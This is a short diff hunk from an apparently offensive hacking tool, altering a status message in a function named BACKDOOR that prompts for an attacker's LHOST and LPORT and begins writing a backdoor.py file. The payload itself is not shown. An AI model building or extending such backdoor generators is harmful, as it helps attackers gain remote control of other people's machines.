@@ -82,7 +82,7 @@ def TEXT_DELAY(TEXT, DELAY):
 def BACKDOOR():
     LHOST = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mLHOST\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
     LPORT = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mLPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
-    print(" \033[97;1m[\033[38;5;208m...\033[0m] Backdoor generation in '.exe' file in progress...\033[0m")
+    print(" \033[97;1m[\033[38;5;208m...\033[0m] Backdoor generation in '.py' file in progress...\033[0m")
     time.sleep(2)
 
     with open("backdoor/backdoor.py", "w") as FILE:
